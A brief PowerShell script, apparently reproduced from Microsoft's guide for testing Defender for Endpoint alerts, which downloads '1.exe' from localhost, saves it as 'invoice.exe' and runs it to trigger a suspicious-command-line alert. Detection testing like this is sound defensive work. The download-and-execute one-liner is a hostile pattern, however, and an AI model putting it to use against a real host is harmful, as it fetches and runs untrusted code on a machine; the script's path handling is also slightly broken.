# https://learn.microsoft.com/en-us/azure/defender-for-cloud/integration-defender-for-endpoint?tabs=windows#test-on-windows
# create the destination folder
[CmdletBinding()]
param (
    [Parameter(ValueFromPipeline=$true,Mandatory=$true)]
    [string]$destPath
)
$destPath = "C:\test-MDATP-test"
New-Item -ItemType Directory -Force -Path $destPath
(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', "C:\\$destPath\\invoice.exe"); Start-Process "C:\\$destPath\\invoice.exe"

<#
To review the alert in Defender for Cloud, go to Security alerts > Suspicious PowerShell CommandLine.
From the investigation window, select the link to go to the Microsoft Defender for Endpoint portal.
#>